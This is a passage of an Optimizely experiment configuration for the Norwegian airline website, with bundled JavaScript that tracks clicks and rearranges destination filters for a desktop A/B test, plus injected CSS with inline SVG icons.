                        }), document.querySelectorAll("nas-toggle.nas-destination-filter__rounded-toggle .nas-toggle__items .nas-toggle__label, nas-toggle.nas-destination-filter__rounded-toggle .nas-toggle__items .nas-toggle__text").forEach(function (catClick) {
                          catClick.addEventListener("click", function () {
                            tracker.push_API_only("Clicks_on_Categories");
                          });
                        }), document.querySelectorAll(".travel-details__actions .travel-details__action")[1].addEventListener("click", function () {
                          tracker.push_API_only("Clicks_on_Direct_Flight_filter");
                        }), bindClickDom(".nas-destination-list__header--selection button.nas-destination-list__icon--left", function () {
                          tracker.push_API_only("Clicks_on_Months_Arrow_elements");
                        }), bindClickDom(".nas-destination-list__header--selection button.nas-destination-list__icon--right", function () {
                          tracker.push_API_only("Clicks_on_Months_Arrow_elements");
                        });
                      }
                      Object(_assets_utilitiesSeparate__WEBPACK_IMPORTED_MODULE_0__.a)(function () {
                        return null !== document.querySelector(".nas-destination-list__item") && null !== document.querySelector("nas-toggle.nas-destination-filter__rounded-toggle .nas-toggle__items .nas-toggle__label") && null !== document.querySelectorAll(".nas-destination-list__header--selection button");
                      }).then(function () {
                        norT136_SharedInit();
                      });
                    }();
                  }, function (module, exports) {
                    function push_API_only(nameOfEvent) {
                      window.optimizely = window.optimizely || [], window.optimizely.push({
                        type: "event",
                        eventName: nameOfEvent
                      });
                    }
                    module.exports = {
                      push_API_only: push_API_only,
                      optimizely_trackers_clicks: function (sel, apiName) {
                        var eventNameDevice = "ontouchstart" in document.documentElement ? "touchstart" : "click";
                        jQuery(document).on(eventNameDevice, sel, function () {
                          push_API_only(apiName);
                        });
                      }
                    };
                  }]);
                },
                "dependencies": []
              }],
              "id": "25261141208",
              "name": "[Code Review] T136 / Destinations / Filters on side / Desktop / SE NO DK",
              "commitId": "25249761147",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
              "integrationStringVersion": 2,
              "experiments": [{
                "audienceIds": ["and", "17279193910"],
                "audienceName": "Test Cookie",
                "changes": null,
                "id": "25253921003",
                "integrationSettings": null,
                "variations": [{
                  "id": "25247931100",
                  "name": "Original",
                  "actions": []
                }, {
                  "id": "25226061087",
                  "name": "Variation #1",
                  "actions": [{
                    "viewId": "25239971235",
                    "changes": [{
                      "id": "2D9BA11E-EADB-423C-AEF2-A1DFBC5ADDDA",
                      "type": "custom_code",
                      "value": function ($) {
                        !function (modules) {
                          var installedModules = {};
                          function __webpack_require__(moduleId) {
                            if (installedModules[moduleId]) return installedModules[moduleId].exports;
                            var module = installedModules[moduleId] = {
                              i: moduleId,
                              l: !1,
                              exports: {}
                            };
                            return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                          }
                          __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                            __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                              enumerable: !0,
                              get: getter
                            });
                          }, __webpack_require__.r = function (exports) {
                            "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                              value: "Module"
                            }), Object.defineProperty(exports, "__esModule", {
                              value: !0
                            });
                          }, __webpack_require__.t = function (value, mode) {
                            if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                            if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                            var ns = Object.create(null);
                            if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                              enumerable: !0,
                              value: value
                            }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                              return value[key];
                            }.bind(null, key));
                            return ns;
                          }, __webpack_require__.n = function (module) {
                            var getter = module && module.__esModule ? function () {
                              return module.default;
                            } : function () {
                              return module;
                            };
                            return __webpack_require__.d(getter, "a", getter), getter;
                          }, __webpack_require__.o = function (object, property) {
                            return Object.prototype.hasOwnProperty.call(object, property);
                          }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 1);
                        }([function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          function waitUntil(predicate) {
                            var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                            return new Promise(function (resolve) {
                              var int = setInterval(function () {
                                predicate() && (resolve(predicate()), clearInterval(int), int = null);
                              }, 500);
                              setTimeout(function () {
                                null !== int && (clearInterval(int), console.log("condition false"));
                              }, time);
                            });
                          }
                          __webpack_require__.d(__webpack_exports__, "a", function () {
                            return waitUntil;
                          });
                        }, function (module, exports, __webpack_require__) {
                          __webpack_require__(5), module.exports = __webpack_require__(6);
                        },,,, function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          __webpack_require__.r(__webpack_exports__);
                          var utilitiesSeparate = __webpack_require__(0);
                          function norT136_getHost() {
                            var host = window.location.hostname.replace("www.norwegian.", "");
                            return "no" !== host && (host = window.location.pathname.split("/")[1]), host;
                          }
                          function norT136_handleDestinationFilter() {
                            document.querySelector(".nas-destination-filter__group-list .nas-toggle__title").textContent = {
                              se: {
                                Destination: "Destinationer",
                                directFlight: "Visa endast direktflyg"
                              },
                              dk: {
                                Destination: "Destinationer",
                                directFlight: "Vis kun direkte fly"
                              },
                              no: {
                                Destination: "Destinasjoner",
                                directFlight: "Vis bare direkte flyvninger"
                              }
                            }[norT136_getHost()].Destination, document.querySelectorAll(".t136_customCheckbox").length < 1 && document.querySelector(".nas-filter__airport-origin-select").insertAdjacentHTML("afterend", '<div class="t136_customCheckbox_group">\n    <input type="checkbox" name="checkbox" value="value" id="t136xheckbox">\n    <label class="t136_customCheckbox" for="t136xheckbox">'.concat({
                              se: {
                                Destination: "Destinationer",
                                directFlight: "Visa endast direktflyg"
                              },
                              dk: {
                                Destination: "Destinationer",
                                directFlight: "Vis kun direkte fly"
                              },
                              no: {
                                Destination: "Destinasjoner",
                                directFlight: "Vis bare direkte flyvninger"
                              }
                            }[norT136_getHost()].directFlight, "</label>\n  </div>")), document.querySelectorAll(".nas-destination-filter__group-list .nas-toggle__items .nas-toggle__item").forEach(function (destination) {
                              var toggleLabelAtt = destination.querySelector(".nas-toggle__label").getAttribute("for");
                              (toggleLabelAtt.includes("destinasjoner") || toggleLabelAtt.includes("destinationer")) && destination.classList.add("destinationer"), destination.addEventListener("click", function () {
                                var destinationerItem = document.querySelector(".nas-destination-filter__group-list .nas-toggle__items .nas-toggle__item.destinationer");
                                destinationerItem && destinationerItem.classList.remove("destinationer"), destination.classList.add("destinationer"), destination.querySelector(".nas-toggle__label").click();
                              });
                            });
                          }
                          !function () {
                            var norT_config_sel = {
                              waitElem: ".nas-travel-tip nas-destination-filter .nas-destination-filter__group-list .nas-toggle__items .nas-toggle__item"
                            };
                            function norT138_init() {
                              var checkbox, actions;
                              console.log("*** T136 / Destinations / Filters on side / Desktop ***"), document.body.classList.add("norT136_filtersOnSide"), norT136_handleDestinationFilter(), Object(utilitiesSeparate.a)(function () {
                                return document.querySelectorAll(".nas-destination-list__destinations--text p.normal").length > 0;
                              }).then(function () {
                                var totalDestination = document.querySelector(".nas-destination-list__destinations--text p.normal");
                                document.querySelector(".nas-destination-list h5").insertAdjacentElement("beforeend", totalDestination);
                              }), checkbox = document.querySelector(".t136_customCheckbox_group .t136_customCheckbox"), actions = document.querySelector(".travel-details__dropdown--transit-type .travel-details__actions"), checkbox.addEventListener("click", function (e) {
                                e.currentTarget.closest(".t136_customCheckbox_group").querySelector("input").checked ? actions.firstElementChild.click() : actions.lastElementChild.click();
                              });
                            }
                            Object(utilitiesSeparate.a)(function () {
                              return document.querySelectorAll(norT_config_sel.waitElem).length > 0;
                            }).then(function () {
                              norT138_init();
                            });
                          }();
                        }, function (module, exports) {}]);
                      },
                      "dependencies": []
                    }, {
                      "id": "318D82BE-0A86-435A-9071-95BFD8E09493",
                      "type": "append",
                      "selector": "head",
                      "value": "<style>body.norT136_filtersOnSide .nas-travel-tip{display:flex}body.norT136_filtersOnSide .nas-travel-tip>div{width:73.3%;padding-left:16px}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter{width:26.7%;background:#fff;padding:0 20px}.nas-destination-filter__group-list .nas-toggle__title{margin-bottom:15px}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__group-list .nas-toggle__items{display:flex !important;flex-direction:column}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__search-filter .nas-filter{background:#fff}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__search-filter .nas-filter .nas-filter__filters{margin-top:18px;flex-direction:column}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__search-filter .nas-filter .nas-filter__filters .nas-airport-select{height:auto;margin-bottom:20px}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__search-filter .nas-filter .nas-filter__filters .nas-filter__origin-combined{display:none}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-airport-select__label{padding:9px 0}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__search-filter .nas-filter input#nas-airport-select-dropdown-input-0{padding:10px 10px;border:3px solid #c3c3c3;height:auto}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__search-filter .nas-airport-select:after{border:none}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__search-filter .nas-filter .nas-airport-select__icon{bottom:13px;right:8px}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__search-filter .nas-airport-select__wrapper--active{background:none;z-index:3}.nas-filter .nas-filter__filters .nas-airport-select__wrapper{z-index:2}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__search-filter .nas-airport-select__wrapper--active input#nas-airport-select-dropdown-input-0{background:#fff}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__group-list .nas-toggle__items .nas-toggle__item{display:flex;width:100%;margin:0 auto;align-items:center;border-bottom:3px solid #c3c3c3;margin-left:0 !important;cursor:pointer;transition:all 0.3s ease}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__group-list .nas-toggle__items .nas-toggle__item:hover{background:#003251;color:#fff;transition:all 0.3s ease}body.norT136_filtersOnSide .nas-destination-list__airport-avatar img{border-radius:0 !important}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-toggle__items .nas-toggle__item .nas-toggle__label{border-radius:0;margin-bottom:0;padding:0;margin-left:15px;margin-right:0}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__group-list .nas-toggle__items .nas-toggle__item:not(:last-child){margin-right:0;margin-left:0}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-toggle__items .nas-toggle__item .nas-toggle__text{width:calc(100% - 60px);font-size:18px;font-weight:600;text-align:left}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__group-list .nas-toggle__items .nas-toggle__item.destinationer{background:#003251;color:#fff}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-toggle--big .nas-toggle__label .nas-icon-medium{background-size:contain;width:30px;height:30px}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__group-list .nas-toggle__items .nas-toggle__item .nas-toggle__label{display:flex;align-items:center;height:60px;width:60px;background:none;border:none}body.norT136_filtersOnSide .nas-destination-list h5{display:flex}body.norT136_filtersOnSide .nas-destination-list h5 p.normal{margin-bottom:0;padding-left:10px;position:relative}body.norT136_filtersOnSide .nas-destination-list h5 p.normal:before{content:':';left:0px;position:absolute;top:2px;font-family:Apercu,Helvetica Neue,Helvetica,Arial,sans-serif;font-weight:700}.nas-destination-filter .nas-destination-filter__rounded-toggle .nas-toggle__items[focus-within] .nas-toggle__label{box-shadow:none !important}.nas-destination-filter .nas-destination-filter__rounded-toggle .nas-toggle__items:focus-within .nas-toggle__label{box-shadow:none !important}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-toggle__item .nas-toggle__label:active{transform:none}body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for*=\"destination-group-rounded-Alla\"] .nas-icon-medium,body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for*=\"destination-group-rounded-Alle\"] .nas-icon-medium{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' version='1.1' id='Ebene_1' x='0px' y='0px' width='48px' height='48px' viewBox='-273 396.9 48 48' enable-background='new -273 396.9 48 48' xml:space='preserve'%3E%3Cg%3E%3Ccircle fill='%23FFFFFF' cx='-241.2' cy='421.2' r='1.7'/%3E%3Ccircle fill='%23FFFFFF' cx='-235.6' cy='421.2' r='1.7'/%3E%3Ccircle fill='%23FFFFFF' cx='-228.4' cy='421.2' r='3.4'/%3E%3Ccircle fill='%23FFFFFF' cx='-245.5' cy='410.7' r='3.4'/%3E%3Ccircle fill='%23FFFFFF' cx='-257.1' cy='412' r='1.7'/%3E%3Ccircle fill='%23FFFFFF' cx='-259.9' cy='407.2' r='1.7'/%3E%3Ccircle fill='%23FFFFFF' cx='-263.5' cy='400.9' r='3.4'/%3E%3Cpath fill='%23FFFFFF' d='M-262.4,419.6c-0.9,0-1.7,0.7-1.7,1.7c0,0.9,0.8,1.7,1.7,1.7s1.7-0.7,1.7-1.7S-261.5,419.6-262.4,419.6z'/%3E%3Cpath fill='%23FFFFFF' d='M-269.6,417.9c-1.9,0-3.4,1.5-3.4,3.3s1.5,3.4,3.4,3.4s3.4-1.5,3.4-3.4 C-266.3,419.4-267.8,417.9-269.6,417.9z'/%3E%3Cpath fill='%23FFFFFF' d='M-256.3,429c-0.8-0.5-1.8-0.2-2.3,0.6s-0.2,1.8,0.6,2.3s1.8,0.2,2.3-0.6 C-255.2,430.5-255.5,429.4-256.3,429z'/%3E%3Cpath fill='%23FFFFFF' d='M-259.1,433.8c-0.8-0.5-1.8-0.2-2.3,0.6c-0.5,0.8-0.2,1.8,0.6,2.3c0.8,0.5,1.8,0.2,2.3-0.6 C-258,435.3-258.3,434.3-259.1,433.8z'/%3E%3Ccircle fill='%23FFFFFF' cx='-263.5' cy='441.5' r='3.4'/%3E%3Cpath fill='%23FFFFFF' d='M-245,429.6c-0.5-0.8-1.5-1.1-2.3-0.6s-1.1,1.5-0.6,2.3c0.5,0.8,1.5,1.1,2.3,0.6 C-244.9,431.4-244.6,430.4-245,429.6z'/%3E%3Ccircle fill='%23FFFFFF' cx='-242.8' cy='436.6' r='3.4'/%3E%3Cpath fill='%23FFFFFF' d='M-245.1,421.2c0-3.7-3-6.7-6.7-6.7s-6.7,3-6.7,6.7s3,6.7,6.7,6.7S-245.1,424.9-245.1,421.2z M-251.8,424.6 c-1.9,0-3.4-1.5-3.4-3.4s1.5-3.3,3.4-3.3c1.9,0,3.4,1.5,3.4,3.3C-248.5,423.1-250,424.6-251.8,424.6z'/%3E%3C/g%3E%3C/svg%3E\")}body.norT136_filtersOnSide .nas-toggle__item.destinationer label[for*=\"destination-group-rounded-Alla\"] .nas-icon-medium{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' version='1.1' id='Ebene_1' x='0px' y='0px' width='48px' height='48px' viewBox='-273 396.9 48 48' enable-background='new -273 396.9 48 48' xml:space='preserve'%3E%3Cg%3E%3Ccircle fill='%23FFFFFF' cx='-241.2' cy='421.2' r='1.7'/%3E%3Ccircle fill='%23FFFFFF' cx='-235.6' cy='421.2' r='1.7'/%3E%3Ccircle fill='%23FFFFFF' cx='-228.4' cy='421.2' r='3.4'/%3E%3Ccircle fill='%23FFFFFF' cx='-245.5' cy='410.7' r='3.4'/%3E%3Ccircle fill='%23FFFFFF' cx='-257.1' cy='412' r='1.7'/%3E%3Ccircle fill='%23FFFFFF' cx='-259.9' cy='407.2' r='1.7'/%3E%3Ccircle fill='%23FFFFFF' cx='-263.5' cy='400.9' r='3.4'/%3E%3Cpath fill='%23FFFFFF' d='M-262.4,419.6c-0.9,0-1.7,0.7-1.7,1.7c0,0.9,0.8,1.7,1.7,1.7s1.7-0.7,1.7-1.7S-261.5,419.6-262.4,419.6z'/%3E%3Cpath fill='%23FFFFFF' d='M-269.6,417.9c-1.9,0-3.4,1.5-3.4,3.3s1.5,3.4,3.4,3.4s3.4-1.5,3.4-3.4 C-266.3,419.4-267.8,417.9-269.6,417.9z'/%3E%3Cpath fill='%23FFFFFF' d='M-256.3,429c-0.8-0.5-1.8-0.2-2.3,0.6s-0.2,1.8,0.6,2.3s1.8,0.2,2.3-0.6 C-255.2,430.5-255.5,429.4-256.3,429z'/%3E%3Cpath fill='%23FFFFFF' d='M-259.1,433.8c-0.8-0.5-1.8-0.2-2.3,0.6c-0.5,0.8-0.2,1.8,0.6,2.3c0.8,0.5,1.8,0.2,2.3-0.6 C-258,435.3-258.3,434.3-259.1,433.8z'/%3E%3Ccircle fill='%23FFFFFF' cx='-263.5' cy='441.5' r='3.4'/%3E%3Cpath fill='%23FFFFFF' d='M-245,429.6c-0.5-0.8-1.5-1.1-2.3-0.6s-1.1,1.5-0.6,2.3c0.5,0.8,1.5,1.1,2.3,0.6 C-244.9,431.4-244.6,430.4-245,429.6z'/%3E%3Ccircle fill='%23FFFFFF' cx='-242.8' cy='436.6' r='3.4'/%3E%3Cpath fill='%23FFFFFF' d='M-245.1,421.2c0-3.7-3-6.7-6.7-6.7s-6.7,3-6.7,6.7s3,6.7,6.7,6.7S-245.1,424.9-245.1,421.2z M-251.8,424.6 c-1.9,0-3.4-1.5-3.4-3.4s1.5-3.3,3.4-3.3c1.9,0,3.4,1.5,3.4,3.3C-248.5,423.1-250,424.6-251.8,424.6z'/%3E%3C/g%3E%3C/svg%3E\")}body.norT136_filtersOnSide .nas-travel-tip nas-destination-filter .nas-destination-filter__group-list .nas-toggle__items .nas-toggle__item label[for=\"destination-group-rounded-Alla\"] .nas-icon-medium{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' version='1.1' id='Ebene_1' x='0px' y='0px' width='48px' height='48px' viewBox='-273 396.9 48 48' enable-background='new -273 396.9 48 48' xml:space='preserve'%3E%3Cg%3E%3Ccircle fill='%23003D4E' cx='-241.2' cy='421.2' r='1.7'/%3E%3Ccircle fill='%23003D4E' cx='-235.6' cy='421.2' r='1.7'/%3E%3Ccircle fill='%23003D4E' cx='-228.4' cy='421.2' r='3.4'/%3E%3Ccircle fill='%23003D4E' cx='-245.5' cy='410.7' r='3.4'/%3E%3Ccircle fill='%23003D4E' cx='-257.1' cy='412' r='1.7'/%3E%3Ccircle fill='%23003D4E' cx='-259.9' cy='407.2' r='1.7'/%3E%3Ccircle fill='%23003D4E' cx='-263.5' cy='400.9' r='3.4'/%3E%3Cpath fill='%23003D4E' d='M-262.4,419.6c-0.9,0-1.7,0.7-1.7,1.7c0,0.9,0.8,1.7,1.7,1.7s1.7-0.7,1.7-1.7S-261.5,419.6-262.4,419.6z'/%3E%3Cpath fill='%23003D4E' d='M-269.6,417.9c-1.9,0-3.4,1.5-3.4,3.3s1.5,3.4,3.4,3.4s3.4-1.5,3.4-3.4 C-266.3,419.4-267.8,417.9-269.6,417.9z'/%3E%3Cpath fill='%23003D4E' d='M-256.3,429c-0.8-0.5-1.8-0.2-2.3,0.6s-0.2,1.8,0.6,2.3s1.8,0.2,2.3-0.6 C-255.2,430.5-255.5,429.4-256.3,429z'/%3E%3Cpath fill='%23003D4E' d='M-259.1,433.8c-0.8-0.5-1.8-0.2-2.3,0.6c-0.5,0.8-0.2,1.8,0.6,2.3c0.8,0.5,1.8,0.2,2.3-0.6 C-258,435.3-258.3,434.3-259.1,433.8z'/%3E%3Ccircle fill='%23003D4E' cx='-263.5' cy='441.5' r='3.4'/%3E%3Cpath fill='%23003D4E' d='M-245,429.6c-0.5-0.8-1.5-1.1-2.3-0.6s-1.1,1.5-0.6,2.3c0.5,0.8,1.5,1.1,2.3,0.6 C-244.9,431.4-244.6,430.4-245,429.6z'/%3E%3Ccircle fill='%23%23003D4E' cx='-242.8' cy='436.6' r='3.4'/%3E%3Cpath fill='%23003D4E' d='M-245.1,421.2c0-3.7-3-6.7-6.7-6.7s-6.7,3-6.7,6.7s3,6.7,6.7,6.7S-245.1,424.9-245.1,421.2z M-251.8,424.6 c-1.9,0-3.4-1.5-3.4-3.4s1.5-3.3,3.4-3.3c1.9,0,3.4,1.5,3.4,3.3C-248.5,423.1-250,424.6-251.8,424.6z'/%3E%3C/g%3E%3C/svg%3E\")}body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item.destinationer label[for=\"destination-group-rounded-Italien\"] .nas-icon-medium,body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for=\"destination-group-rounded-Italien\"] .nas-icon-medium,body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for=\"destination-group-rounded-Italia\"] .nas-icon-medium{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='-273 396.9 48 48' id='medium--from-a-to-b--light' y='3480'%3E%3Cpath fill='%23FFF' d='M-225.3 417.5c0-1.6-6.3-4.3-11.1-4.4h-2.6v6.8h5.6c3.9 0 8.1-1.5 8.1-2.4zM-241.2 413.1h-17.6c-2.2-2.6-5.8-7.1-6.4-7.8-.8-1-1.8-1.4-1.8-1.4h-3l2 9.2h-5v1.2l15.3 5.6h3.6c-.5.4-.8 1-.8 1.5 0 1.6 3.1 2.8 6.9 2.8s4.4-1.3 4.4-2.8v-1.5h2.3v-6.8h.1z'/%3E%3Ccircle fill='%23FFF' cx='-269' cy='431.9' r='4'/%3E%3Ccircle fill='%23FFF' cx='-229' cy='431.9' r='4'/%3E%3Ccircle fill='%23FFF' cx='-260' cy='431.9' r='2'/%3E%3Ccircle fill='%23FFF' cx='-253' cy='431.9' r='2'/%3E%3Ccircle fill='%23FFF' cx='-245' cy='431.9' r='2'/%3E%3Ccircle fill='%23FFF' cx='-238' cy='431.9' r='2'/%3E%3C/svg%3E\")}body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item label[for=\"destination-group-rounded-Italien\"] .nas-icon-medium{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='-273 396.9 48 48' id='medium--from-a-to-b' y='3432'%3E%3Cpath fill='%23003D4E' d='M-225.3 417.5c0-1.6-6.3-4.3-11.1-4.4h-2.6v6.8h5.6c3.9 0 8.1-1.5 8.1-2.4zM-241.2 413.1h-17.6c-2.2-2.6-5.8-7.1-6.4-7.8-.8-1-1.8-1.4-1.8-1.4h-3l2 9.2h-5v1.2l15.3 5.6h3.6c-.5.4-.8 1-.8 1.5 0 1.6 3.1 2.8 6.9 2.8s4.4-1.3 4.4-2.8v-1.5h2.3v-6.8h.1z'/%3E%3Ccircle fill='%23003D4E' cx='-269' cy='431.9' r='4'/%3E%3Ccircle fill='%23003D4E' cx='-229' cy='431.9' r='4'/%3E%3Ccircle fill='%23003D4E' cx='-260' cy='431.9' r='2'/%3E%3Ccircle fill='%23003D4E' cx='-253' cy='431.9' r='2'/%3E%3Ccircle fill='%23003D4E' cx='-245' cy='431.9' r='2'/%3E%3Ccircle fill='%23003D4E' cx='-238' cy='431.9' r='2'/%3E%3C/svg%3E\")}body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for=\"destination-group-rounded-Norden\"] .nas-icon-medium{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='-396 571.5 48 48' id='medium--type-scandinavia--light' y='6503'%3E%3Cpath fill='%23FFF' d='M-385.3 573.4c.5.3 1.2.5 1.5.5s.9-.2 1.5-.5c.5-.3.5-1 0-1.5h2c.5.5 1.4 1.5 2 2 .5.5.8 1.5.5 2s-.7 1.2-1 1.5l-1.5 1.5c-.6.5-1.5 1.2-2 1.5-.6.3-1.5.5-2 .5-.6 0-1.5-.5-2-1-.6-.5-1.2-1-1.5-1s-.3-.2 0-.5.3-.7 0-1-1.3-.9-2.3-1.4c0 0-.2-.1.8-.1h1c.5-.5.5-1.2 0-1.5-.6-.3-.8-1-.5-1.5s.9-.8 1.5-.5 1.5.8 2 1zM-359.8 574.4c.3-.3-.2-.7-1-1s-1.7-.3-2 0-.7.3-1 0-1.2-.3-2 0-1.5.7-1.5 1-.5.7-1 1c-.6.3-1.2.5-1.5.5s-1 .7-1.5 1.5c-.6.8-1 1.7-1 2s-.5.5-1 .5c-.6 0-1.2.5-1.5 1s-.3 1.2 0 1.5 0 1.3-.5 2.2l-.9 1.6c-.6.9-1 2.2-1 2.7s-.7 1.2-1.5 1.5-1.7 1.2-2 2-1 2-1.5 2.5c-.6.5-1.7 1.2-2.5 1.5s-2.2 1-3 1.5-1.3 1.9-1 2.9v.1c.3 1.1.5 2.6.5 3.4v3c0 .8.4 1.5 1 1.5h2.5c.8 0 1.9-.5 2.5-1 .5-.5 1.2-1 1.5-1s.2.9-.1 1.9c0 0-.4 1.1.6 1.1s1 1 1 1c0 1.1.4 2.5 1 3 .5.5.8 1.2.5 1.5s.2 1 1 1.5 1.9.5 2.5 0c.5-.5 1.4-1 2-1v-1c0-1 2-5 2-6s2-2 2-3-.6-1.6-.6-1.6c-.8-.8-1.6-2.3-1.8-3.4l-.2-1.1c-.2-1.1.1-2.4.6-3 .5-.5 1.4-1.2 2-1.5.5-.3 1.2-1.2 1.5-2s.3-1.7 0-2 .3-.9 1.3-1.4c0 0 .2-.1.2-1.1v-1h2.5c.3 0 .7.7 1 1.5s.3 1.5 0 1.5-1 .7-1.7 1.6l-.6.8c-.7.9-1.4 1.6-1.7 1.6-.3 0-.5.9-.5 2s.2 2.5.5 3 .5 1.5.5 2 .8 1.4 1.8 1.9c0 0 .2.1 1.2.1s3.2-1.1 3.2-1.1c1-.5 2.2-1.3 2.8-1.9.5-.5 1.3-1.9 1.6-2.9l.7-2.2c.3-1 0-2.3-.9-2.9-.8-.5-1.5-1.5-1.5-2s-.2-1.5-.5-2-.3-1.2 0-1.5 0-1.2-.5-2c-.6-.8-1-2-1-2.5s-.5-1.2-1-1.5c-.6-.3-1-1.4-1-2.5v-1c0-1.1.4-2 1-2 .5 0 .5-.2 0-.5-.5 0-.7-.5-.5-.8z'/%3E%3Cpath fill='%23FFF' d='M-382.3 612.4c0-.3-.5-.3-1 0-.6.3-1.2.5-1.5.5s-.5.7-.5 1.5.2 2 .5 2.5.9 1.2 1.5 1.5c.5.3 1 .3 1 0s.8-.1 1.8.4l.4.2c1 .5 1.6.2 1.3-.6-.3-.8-.7-1.7-1-2s-.7 0-1 .5-.7.5-1 0-.3-1.2 0-1.5 0-1-.5-1.5v-1-1 .5z'/%3E%3C/svg%3E\")}body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for=\"destination-group-rounded-Norge\"] .nas-icon-medium{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='-396 571.5 48 48' id='medium--type-norway--light' y='6407'%3E%3Cg fill='%23FFF'%3E%3Cpath d='M-385 579.1c-3.7-.1-7.3.4-11 2v10c3.7-1.6 7.3-2.1 11-2v-10zM-376 580.2v10c9.3 1.9 18.7 4.9 28 .8v-10c-9.3 4.1-18.7 1.1-28-.8zM-396 610c3.7-1.6 7.3-2.1 11-2v-10c-3.7-.1-7.3.4-11 2v10zM-376 609.2c9.3 1.9 18.7 4.9 28 .8v-10c-9.3 4.1-18.7 1-28-.8v10z'/%3E%3Cpath d='M-378 579.8c-1.7-.3-3.3-.5-5-.7v12c-4.3-.3-8.7 0-13 1.9v5c4.3-1.9 8.7-2.2 13-1.9v12c1.7.1 3.3.4 5 .7v-12c10 1.8 20 5.6 30 1.2v-5c-10 4.4-20 .5-30-1.2v-12z'/%3E%3C/g%3E%3C/svg%3E\")}body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for=\"destination-group-rounded-Nya rutter\"] .nas-icon-medium,body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for=\"destination-group-rounded-Nye ruter\"] .nas-icon-medium{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='-273 396.9 48 48' id='medium--from-a-to-b--light' y='3480'%3E%3Cpath fill='%23FFF' d='M-225.3 417.5c0-1.6-6.3-4.3-11.1-4.4h-2.6v6.8h5.6c3.9 0 8.1-1.5 8.1-2.4zM-241.2 413.1h-17.6c-2.2-2.6-5.8-7.1-6.4-7.8-.8-1-1.8-1.4-1.8-1.4h-3l2 9.2h-5v1.2l15.3 5.6h3.6c-.5.4-.8 1-.8 1.5 0 1.6 3.1 2.8 6.9 2.8s4.4-1.3 4.4-2.8v-1.5h2.3v-6.8h.1z'/%3E%3Ccircle fill='%23FFF' cx='-269' cy='431.9' r='4'/%3E%3Ccircle fill='%23FFF' cx='-229' cy='431.9' r='4'/%3E%3Ccircle fill='%23FFF' cx='-260' cy='431.9' r='2'/%3E%3Ccircle fill='%23FFF' cx='-253' cy='431.9' r='2'/%3E%3Ccircle fill='%23FFF' cx='-245' cy='431.9' r='2'/%3E%3Ccircle fill='%23FFF' cx='-238' cy='431.9' r='2'/%3E%3C/svg%3E\")}body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for=\"destination-group-rounded-Sol och Bad\"] .nas-icon-medium,body.norT136_filtersOnSide .nas-toggle__items .nas-toggle__item:hover label[for=\"destination-group-rounded-Sol og Bad\"] .nas-icon-medium{background-image:url(\"data:image/svg+xml,%3Csvg 